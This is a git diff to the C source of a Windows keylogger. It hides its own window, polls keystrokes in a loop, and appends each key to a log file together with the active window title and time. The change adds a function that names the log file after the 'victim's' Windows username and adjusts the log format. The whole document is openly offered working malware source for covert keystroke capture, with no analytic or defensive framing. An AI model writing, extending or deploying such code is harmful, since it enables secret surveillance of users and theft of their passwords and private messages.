@@ -8,6 +8,7 @@
 
 // FUNCTION DECLARATIONS //
 void HideWindow();
+void CreateLogfile(char* filename);
 void GetCurrentWindow(char* window, char* new_window, FILE* logfile);
 void KeystrokeHandler(short key, FILE* logfile);
 
@@ -22,6 +23,10 @@ int main(){
     HWND foreground = GetForegroundWindow();
     GetWindowText(foreground, window, BUF_SIZE);
 
+    // create logfile filename
+    char filename[BUF_SIZE];
+    CreateLogfile(filename);
+
     while(1){
 
         Sleep(10); // reduce CPU usage
@@ -35,7 +40,7 @@ int main(){
 
                 // open/create keylog file then handle keystroke
                 FILE* logfile;
-                logfile = fopen("LOG.txt", "a");
+                logfile = fopen(filename, "a");
                 GetCurrentWindow(window, new_window, logfile);
                 KeystrokeHandler(key, logfile);
                 fclose(logfile);
@@ -55,6 +60,14 @@ void HideWindow(){
     ShowWindow(stealth, 0); // set to 0 to not display
 }
 
+// develops the filename of the logfile based on victim's current user
+void CreateLogfile(char* filename){
+    char username[BUF_SIZE+1];
+    DWORD len = BUF_SIZE+1;
+    GetUserName(username, &len);
+    sprintf(filename, "%s_LOG.txt", username);
+}
+
 // get the current working window of the user
 void GetCurrentWindow(char* window, char* new_window, FILE* logfile){
     HWND new_foreground = GetForegroundWindow();
@@ -63,12 +76,13 @@ void GetCurrentWindow(char* window, char* new_window, FILE* logfile){
     // check if window has changed/updated
     if(strcmp(window, new_window)){
         strcpy(new_window, window);
+
+        // if changed/updated, get display current window and time
         if(!strcmp(window, new_window) && strcmp(window, "")){
             time_t curr_time = time(NULL);
             char* curr_time_str = ctime(&curr_time);
 
-            // display current window and time to document the logged keystrokes
-            fprintf(logfile, "\n\nWINDOW: %s TIME: %s", new_window, curr_time_str);
+            fprintf(logfile, "\n\nWINDOW: %s | TIME: %s", new_window, curr_time_str);
             fflush(logfile);
         }
     }
